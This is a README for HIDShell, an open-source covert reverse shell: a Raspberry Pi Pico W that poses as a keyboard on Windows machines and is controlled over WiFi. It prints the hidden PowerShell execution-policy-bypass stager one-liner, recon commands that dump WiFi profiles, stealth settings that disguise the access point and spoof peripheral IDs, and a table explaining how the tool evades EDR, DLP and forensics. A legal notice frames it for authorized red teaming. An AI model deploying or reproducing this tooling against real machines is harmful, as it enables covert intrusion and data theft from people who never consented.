<p align="center">
  <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square&logo=windows" />
  <img src="https://img.shields.io/badge/device-Raspberry%20Pi%20Pico%20W-purple?style=flat-square&logo=raspberrypi" />
  <img src="https://img.shields.io/badge/lang-CircuitPython%20%7C%20PowerShell-green?style=flat-square&logo=python" />
  <img src="https://img.shields.io/badge/license-MIT-red?style=flat-square" />
</p>

<p align="center">
  <pre align="center">
  _   _ ___ ____  ____  _          _ _ 
 | | | |_ _|  _ \/ ___|| |__   ___| | |
 | |_| || || | | \___ \| '_ \ / _ \ | |
 |  _  || || |_| |___) | | | |  __/ | |
 |_| |_|___|____/|____/|_| |_|\___|_|_|
  </pre>
</p>

<h3 align="center">Covert USB HID Reverse Shell</h3>

<p align="center">
  <i>A $6 Raspberry Pi Pico W that deploys a hidden shell on any Windows target.<br>
  Commands flow through vendor HID reports. Output exfiltrates via keyboard LED toggles.<br>
  The attacker controls everything from a WiFi dashboard on their phone.</i>
</p>

<p align="center">
  <b>No network &nbsp;·&nbsp; No files on disk &nbsp;·&nbsp; No detection</b>
</p>

<p align="center">
  <a href="https://youtube.com/@0dayscyber"><b>Watch Demo</b></a> &nbsp;·&nbsp;
  <a href="#-quick-start"><b>Quick Start</b></a> &nbsp;·&nbsp;
  <a href="#-how-it-works"><b>How It Works</b></a> &nbsp;·&nbsp;
  <a href="#-architecture"><b>Architecture</b></a>
</p>

---

## What is this?

HIDShell is an open-source covert reverse shell that communicates entirely over USB HID — the same protocol your keyboard uses. Plug the Pico W into any Windows machine, connect to its WiFi from your phone, and you have a hidden shell session running through the browser dashboard.

**The victim machine sees a keyboard. Nothing more.**

On plug-in, the Pico W types a single Run dialog command that loads a PowerShell listener from its own flash drive into memory. After that, commands flow silently through a vendor-defined HID interface — no more keystrokes, no pop-ups, no visible activity. The listener executes commands and sends output back by toggling keyboard LEDs, which the Pico decodes and pushes to your browser.

No TCP. No DNS. No files on the victim's disk.

```
┌──────────────┐         USB HID          ┌──────────────┐
│    VICTIM     │◄════════════════════════►│   PICO W      │
│              │   Keyboard + Vendor HID   │               │
│  PowerShell  │                           │  code.py      │
│  listener    │                           │               │
│  (in memory) │  ◄── Cmds (Vendor HID) ──│  WiFi AP ─────┼──► Attacker
│              │  ── Output (LED toggles)─►│  Dashboard    │    (phone)
└──────────────┘                           └──────────────┘
```

> **⚠️ Legal Notice:** This tool is for authorized penetration testing and red team engagements only. Unauthorized access to computer systems is illegal. Always obtain written authorization before use.

---

## Why?

| Problem | HIDShell's Answer |
|---------|-------------------|
| Network C2 triggers IDS/NDR | **Zero network traffic from the victim** |
| EDR monitors process behaviour | **HID reports bypass userspace hooks** |
| DLP watches file writes | **Listener runs entirely from memory** |
| USB device policies block storage | **HID keyboard class is always trusted** |
| Physical access tools are closed-source | **Fully open, audit everything** |
| Diabolic Shell costs $100+ and is closed-source | **$6 Pico W, MIT licensed** |

---

## 🏗️ Architecture

HIDShell uses a hybrid transport — two separate covert channels optimized for their direction:

### Command Channel (Attacker → Victim)

Commands are sent via **vendor-defined HID Input Reports** through a custom USB interface registered alongside the keyboard. The Pico's `send_report()` pushes 63-byte reports that the PowerShell listener reads via `ReadFile()` on the vendor HID device handle.

This channel is completely silent — no keystrokes are typed, no windows appear, no processes spawn. The victim sees normal USB HID traffic indistinguishable from a gaming mouse's DPI settings.

Commands use Diabolic Shell-compatible framing: `<<START:N>>command<<END>>`.

### Response Channel (Victim → Attacker)

Command output is exfiltrated via **keyboard LED state toggles**. The PowerShell listener uses `keybd_event()` to toggle NumLock, CapsLock, and ScrollLock, encoding each byte MSB-first:

```
NumLock toggle   = bit 1
CapsLock toggle  = bit 0
ScrollLock toggle = commit byte (after 8 bits)
```

The Pico reads these LED changes from the keyboard's HID OUT report and reassembles the original text. After a 3-second timeout with no LED activity, the accumulated response is delivered to the web dashboard.

### Channel Summary

| Channel | Direction | Transport | Method | Speed |
|---------|-----------|-----------|--------|-------|
| **Commands** | Attacker → Victim | Vendor HID Reports | `send_report()` → `ReadFile()` | Instant |
| **Responses** | Victim → Attacker | Keyboard LED Toggles | `keybd_event()` → LED report | ~3 bytes/s |

### Auto-Deployment

On plug-in, the Pico W waits 1 second then types a single command into the Windows Run dialog:

```
powershell -w h -Ep Bypass -c "gdr -P FileSystem|%{$f=$_.Root+'s.ps1';if(Test-Path $f){iex(gc $f -Raw);break}}"
```

This hidden PowerShell scans all drive letters, finds `s.ps1` on the Pico's own `CIRCUITPY` flash drive, and executes it in memory. The stager compiles C# P/Invoke bindings for `SetupDi`, `CreateFile`, and `ReadFile`, locates the vendor HID device by VID/PID/UsagePage, opens it, and enters a read loop waiting for commands.

When the Pico is unplugged, `s.ps1` leaves with it. Nothing persists on the victim.

---

## 🚀 Quick Start

### Hardware

| Item | Price | Notes |
|------|-------|-------|
| **Raspberry Pi Pico W** | ~$6 | Required for WiFi mode |
| Micro-USB cable | — | You already have one |

That's it. No adapters, no custom PCBs, no soldering.

### Step 1 — Flash CircuitPython

1. Hold **BOOTSEL** while plugging in the Pico W
2. It mounts as `RPI-RP2`
3. Download the CircuitPython **10.x** `.uf2` from [circuitpython.org](https://circuitpython.org/board/raspberry_pi_pico_w/)
4. Drag the `.uf2` onto the drive
5. It reboots and mounts as `CIRCUITPY`

### Step 2 — Deploy Files

Copy these files to the root of `CIRCUITPY`:

```
CIRCUITPY/
├── boot.py       ← USB HID descriptor (keyboard + vendor HID)
├── code.py       ← Rename code_wifi.py to code.py
└── s.ps1         ← PowerShell listener (auto-loaded into victim memory)
```

### Step 3 — Power Cycle

**Unplug and replug the Pico W.** USB descriptors only register at cold boot — a soft reset won't apply the `boot.py` changes.

### Step 4 — Verify

Open **Device Manager** on Windows → **Human Interface Devices**:

- ✅ `HID Keyboard Device` — the LED response channel
- ✅ `HID-compliant vendor-defined device` — the command channel

If you only see the keyboard, `boot.py` didn't run. Check `boot_out.txt` on `CIRCUITPY` for errors.

### Step 5 — Connect and Send Commands

1. On your phone or laptop, connect to the WiFi AP:
   ```
   SSID:     HIDShell
   Password: h4ckth3pl4n3t
   ```
2. Open `http://192.168.4.1` in a browser
3. Type a command and hit **RUN**

```
> whoami
> ipconfig
> netsh wlan show profiles
> dir $env:USERPROFILE\Desktop
```

Watch the target's keyboard LEDs flicker as the response exfiltrates back to your dashboard.

---

## 🔧 Configuration

### WiFi AP

Edit the top of `code_wifi.py`:

```python
AP_SSID     = "HIDShell"          # Network name
AP_PASSWORD = "h4ckth3pl4n3t"     # Min 8 characters
AP_IP       = "192.168.4.1"       # Dashboard address
STAGE_DELAY = 1                   # Seconds before auto-deploy
```

### Stager (s.ps1)

| Parameter | Default | Description |
|-----------|---------|-------------|
| `$VI` | `0x239A` | USB Vendor ID to match |
| `$PI` | `0x8120` | USB Product ID (Pico W on CP10) |
| `$UP` | `0xFF00` | Vendor HID Usage Page |
| `$RI` | `4` | HID Report ID |
| LED bit delay | `35ms` | Milliseconds between LED toggles |
| LED commit delay | `45ms` | Milliseconds after ScrollLock commit |

### boot.py

| Parameter | Value | Notes |
|-----------|-------|-------|
| `usage_page` | `0xFF` | Vendor-defined (CP truncates `0xFF00` to 1 byte) |
| `report_ids` | `(4,)` | Avoids collision with keyboard report ID 1 |
| `in_report_lengths` | `(63,)` | Command payload per HID report |
| `out_report_lengths` | `(63,)` | Output report size (descriptor placeholder) |

### WiFi Range

| Scenario | Range |
|----------|-------|
| Indoor, through walls | 15–25m |
| Indoor, line of sight | 30–50m |
| Outdoor, line of sight | 50–80m |

A high-gain adapter (Alfa AWUS036ACH etc.) on the attacker side significantly extends range. The bottleneck is the Pico W's PCB trace antenna — your Alfa compensates on the receive side.

---

## 🔒 Engagement Hardening

For operational deployments:

```python
# boot.py — uncomment to hide evidence
# storage.disable_usb_drive()    # Remove CIRCUITPY from file explorer
# usb_cdc.disable()              # Disable USB serial (no Thonny)
```

```python
# code_wifi.py — stealth AP
AP_SSID = "HP_OfficeJet_5200"    # Blend into the environment
AP_HIDDEN = True                  # Hidden SSID
```

```python
# s.ps1 — match target's existing peripherals
$VI=0x1532    # e.g. Razer
$PI=0x02A2    # e.g. Ornata V3
```

---

## 🛡️ Why This Evades Detection

| Layer | Why it's blind |
|-------|----------------|
| **Network monitoring** | Zero TCP/DNS/HTTP from the victim — WiFi is on the Pico |
| **EDR** | HID reports travel below the API layer EDR hooks |
| **DLP** | No files written to victim disk — listener runs from memory |
| **USB device policies** | HID keyboard class is universally trusted |
| **Process monitoring** | PowerShell launches hidden via `-w h`, no visible window |
| **Forensics** | `s.ps1` lives on the Pico's flash — unplugging removes all evidence |

---

## 🔍 Debugging

### Check the stager log

If commands aren't executing, check the stager's debug log on the victim:

```powershell
cat $env:tmp\hs.log
```

This shows each stage: Add-Type compilation, device discovery (VID/PID/UsagePage), `CreateFile` result, and every command received/executed.

### Common issues

| Symptom | Cause | Fix |
|---------|-------|-----|
| `Device not found` in log | Wrong VID/PID in `s.ps1` | Check Device Manager for actual VID/PID |
| LEDs flicker but no output in dashboard | LED timing too fast | Increase delays in `s.ps1` TX function |
| Only keyboard appears in Device Manager | `boot.py` didn't run | Full power cycle (unplug/replug) |
| Stager doesn't launch | Run dialog didn't open in time | Increase `STAGE_DELAY` in `code_wifi.py` |
| Garbled output | Bit/byte desync | Power cycle Pico to reset LED state tracking |

---

## 📂 Project Structure

```
hidshell/
├── boot.py              # USB HID descriptor configuration
│                        # Registers keyboard + vendor HID interface
│
├── code_wifi.py         # Pico W WiFi C2 controller
│                        # WiFi AP + HTTP dashboard + LED decoder
│                        # Rename to code.py on CIRCUITPY
│
├── s.ps1                # PowerShell listener / stager
│                        # Auto-deployed from CIRCUITPY flash
│                        # Runs in memory on the victim
│                        # SetupDi + CreateFile + ReadFile + keybd_event
│
└── README.md            # You are here
```

---

## 🗺️ Roadmap

- [ ] **Error correction** — CRC per frame with retransmission
- [ ] **Compression** — zlib before LED transmission for faster exfil
- [ ] **Encryption** — AES-CTR with pre-shared key
- [ ] **File exfiltration** — `DOWNLOAD <path>` command support
- [ ] **Air-gapped deployment** — base64 chunk injection (Method 2) for offline targets
- [ ] **Interactive shell** — persistent cmd.exe / powershell.exe session support

---

## Contributing

Pull requests welcome. If you're building detection for this — even better. Open-source offensive tools make everyone's security stronger.

1. Fork the repo
2. Create a feature branch (`git checkout -b feature/my-improvement`)
3. Commit changes (`git commit -m 'add my improvement'`)
4. Push (`git push origin feature/my-improvement`)
5. Open a Pull Request

---

## References

- [USB HID Specification](https://www.usb.org/hid) — LED indicator usage
- [CircuitPython USB HID docs](https://docs.circuitpython.org/en/latest/shared-bindings/usb_hid/)
- [HID Report Descriptors](https://eleccelerator.com/usbdescreqparser/) — descriptor parser tool

---

<p align="center">
  <b>Built for the offensive security community by <a href="https://youtube.com/@0dayscyber">0dayscyber</a></b><br>
  <sub>MIT License — use it, fork it, break it, improve it. Stay legal.</sub>
</p>
